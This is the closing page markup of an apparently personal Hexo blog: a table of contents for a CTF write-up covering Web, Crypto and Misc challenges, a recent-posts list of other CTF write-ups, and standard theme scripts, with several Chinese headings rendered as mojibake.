class="toc-text">PharOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OtenkiBoy"><span class="toc-number">1.4.7.</span> <span class="toc-text">OtenkiBoy ()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5"><span class="toc-number">1.5.</span> <span class="toc-text">week5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize-Again"><span class="toc-number">1.5.1.</span> <span class="toc-text">Unserialize Again</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final"><span class="toc-number">1.5.2.</span> <span class="toc-text">Final</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ye%E2%80%99s-Pickle"><span class="toc-number">1.5.3.</span> <span class="toc-text">Yeâ€™s Pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pppython"><span class="toc-number">1.5.4.</span> <span class="toc-text">pppython?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%8D%E7%9B%98"><span class="toc-number">1.5.5.</span> <span class="toc-text">4-å¤ç›˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NextDrive"><span class="toc-number">1.5.6.</span> <span class="toc-text">NextDrive()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-1"><span class="toc-number">2.1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#brainfuck"><span class="toc-number">2.1.1.</span> <span class="toc-text">brainfuck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar%E2%80%99s-Secert"><span class="toc-number">2.1.2.</span> <span class="toc-text">Caesarâ€™s Secert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fence"><span class="toc-number">2.1.3.</span> <span class="toc-text">Fence</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vigenere"><span class="toc-number">2.1.4.</span> <span class="toc-text">VigenÃ¨re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyencoding"><span class="toc-number">2.1.5.</span> <span class="toc-text">babyencoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa"><span class="toc-number">2.1.6.</span> <span class="toc-text">babyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Small-d"><span class="toc-number">2.1.7.</span> <span class="toc-text">Small d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyxor"><span class="toc-number">2.1.8.</span> <span class="toc-text">babyxor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Affine"><span class="toc-number">2.1.9.</span> <span class="toc-text">Affine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyaes"><span class="toc-number">2.1.10.</span> <span class="toc-text">babyaes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2-1"><span class="toc-number">2.2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%B4%E5%95%A4"><span class="toc-number">2.2.1.</span> <span class="toc-text">æ»´å•¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AApi"><span class="toc-number">2.2.2.</span> <span class="toc-text">ä¸æ­¢ä¸€ä¸ªpi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#halfcandecode"><span class="toc-number">2.2.3.</span> <span class="toc-text">halfcandecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rotate-Xor"><span class="toc-number">2.2.4.</span> <span class="toc-text">Rotate Xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#partial-decrypt"><span class="toc-number">2.2.5.</span> <span class="toc-text">partial decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#broadcast"><span class="toc-number">2.2.6.</span> <span class="toc-text">broadcast</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3-1"><span class="toc-number">2.3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabin%E2%80%99s-RSA"><span class="toc-number">2.3.1.</span> <span class="toc-text">Rabinâ€™s RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">2.3.2.</span> <span class="toc-text">å°æ˜çš„å¯†ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrandom"><span class="toc-number">2.3.3.</span> <span class="toc-text">babyrandom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#knapsack"><span class="toc-number">2.3.4.</span> <span class="toc-text">knapsack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eazy-crt"><span class="toc-number">2.3.5.</span> <span class="toc-text">eazy_crt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Door"><span class="toc-number">2.3.6.</span> <span class="toc-text">Door</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4-1"><span class="toc-number">2.4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-Variation-II"><span class="toc-number">2.4.1.</span> <span class="toc-text">RSA Variation II</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyNTRU"><span class="toc-number">2.4.2.</span> <span class="toc-text">babyNTRU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smart"><span class="toc-number">2.4.3.</span> <span class="toc-text">Smart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-number">2.4.4.</span> <span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#error"><span class="toc-number">2.4.5.</span> <span class="toc-text">error</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5-1"><span class="toc-number">2.5.</span> <span class="toc-text">week5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#last-signin"><span class="toc-number">2.5.1.</span> <span class="toc-text">last_signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#School-of-CRC32"><span class="toc-number">2.5.2.</span> <span class="toc-text">School of CRC32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PseudoHell-EASY"><span class="toc-number">2.5.3.</span> <span class="toc-text">PseudoHell_EASY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PseudoHell-HARD"><span class="toc-number">2.5.4.</span> <span class="toc-text">PseudoHell_HARD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1-2"><span class="toc-number">3.1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CyberChef%E2%80%99s-Secret"><span class="toc-number">3.1.1.</span> <span class="toc-text">CyberChefâ€™s Secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E5%AF%86%E5%9B%BE%E7%89%87"><span class="toc-number">3.1.2.</span> <span class="toc-text">æœºå¯†å›¾ç‰‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%EF%BC%81%E9%B2%A8%E9%B1%BC%EF%BC%81"><span class="toc-number">3.1.3.</span> <span class="toc-text">æµé‡ï¼é²¨é±¼ï¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BB%AC"><span class="toc-number">3.1.4.</span> <span class="toc-text">å‹ç¼©åŒ…ä»¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E7%99%BD%E6%A0%BC"><span class="toc-number">3.1.5.</span> <span class="toc-text">ç©ºç™½æ ¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E7%9A%84%E7%9C%BC%E7%9D%9B"><span class="toc-number">3.1.6.</span> <span class="toc-text">éšç§˜çš„çœ¼ç›</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2-2"><span class="toc-number">3.2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BAWord%E6%96%87%E6%A1%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">æ–°å»ºWordæ–‡æ¡£</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B8%E4%B8%8D%E6%B6%88%E9%80%9D%E7%9A%84%E7%94%B5%E6%B3%A2"><span class="toc-number">3.2.2.</span> <span class="toc-text">æ°¸ä¸æ¶ˆé€çš„ç”µæ³¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BA%8F%E7%AB%A0"><span class="toc-number">3.2.3.</span> <span class="toc-text">1-åºç« </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base"><span class="toc-number">3.2.4.</span> <span class="toc-text">base!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.5.</span> <span class="toc-text">WebShellçš„åˆ©ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jvav"><span class="toc-number">3.2.6.</span> <span class="toc-text">Jvav</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3-2"><span class="toc-number">3.3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B3%E5%85%89%E5%BC%80%E6%9C%97%E5%A4%A7%E7%94%B7%E5%AD%A9"><span class="toc-number">3.3.1.</span> <span class="toc-text">é˜³å…‰å¼€æœ—å¤§ç”·å­©</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%80%A8%E7%A7%8D"><span class="toc-number">3.3.2.</span> <span class="toc-text">å¤§æ€¨ç§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-number">3.3.3.</span> <span class="toc-text">2-åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E4%BE%A0"><span class="toc-number">3.3.4.</span> <span class="toc-text">é”®ç›˜ä¾ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%B4%E6%BB%B4%E6%BB%B4"><span class="toc-number">3.3.5.</span> <span class="toc-text">æ»´æ»´æ»´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4-2"><span class="toc-number">3.4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#R%E9%80%9A%E5%A4%A7%E6%AE%8B"><span class="toc-number">3.4.1.</span> <span class="toc-text">Ré€šå¤§æ®‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">3.4.2.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E6%97%A7%E6%98%AF%E7%A9%BA%E7%99%BD"><span class="toc-number">3.4.3.</span> <span class="toc-text">ä¾æ—§æ˜¯ç©ºç™½</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BA%AF%E6%BA%90"><span class="toc-number">3.4.4.</span> <span class="toc-text">3-æº¯æº</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%96%E8%AF%81"><span class="toc-number">3.4.5.</span> <span class="toc-text">ç¬¬ä¸€æ¬¡å–è¯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week5-2"><span class="toc-number">3.5.</span> <span class="toc-text">week5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E7%A7%98%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-number">3.5.1.</span> <span class="toc-text">éšç§˜çš„å›¾ç‰‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezhard"><span class="toc-number">3.5.2.</span> <span class="toc-text">ezhard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BAPython%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.3.</span> <span class="toc-text">æ–°å»ºPythonæ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyAntSword"><span class="toc-number">3.5.4.</span> <span class="toc-text">BabyAntSword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easymem"><span class="toc-number">3.5.5.</span> <span class="toc-text">Easymem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enigma"><span class="toc-number">3.5.6.</span> <span class="toc-text">Enigma</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/23/CNSS-Recruit2025-Crypto-WriteUp/" title="CNSS-Recruit2025-Crypto-WriteUp">CNSS-Recruit2025-Crypto-WriteUp</a><time datetime="2025-11-23T03:00:00.000Z" title="Created 2025-11-23 11:00:00">2025-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/" title="ç¾ŠåŸæ¯2025-WriteUp">ç¾ŠåŸæ¯2025-WriteUp</a><time datetime="2025-10-12T16:00:00.000Z" title="Created 2025-10-13 00:00:00">2025-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/07/Securinets-CTF2025-Misc-WriteUp/" title="Securinets CTF2025 Misc-WriteUp">Securinets CTF2025 Misc-WriteUp</a><time datetime="2025-10-06T16:18:49.000Z" title="Created 2025-10-07 00:18:49">2025-10-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/WMCTF2025-WriteUp/" title="WMCTF2025-WriteUp">WMCTF2025-WriteUp</a><time datetime="2025-09-20T16:18:08.000Z" title="Created 2025-09-21 00:18:08">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/15/N1CTF-Junior-2025-2-2-WriteUp/" title="N1CTF Junior 2025 2/2 WriteUp">N1CTF Junior 2025 2/2 WriteUp</a><time datetime="2025-09-14T16:00:01.000Z" title="Created 2025-09-15 00:00:01">2025-09-15</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>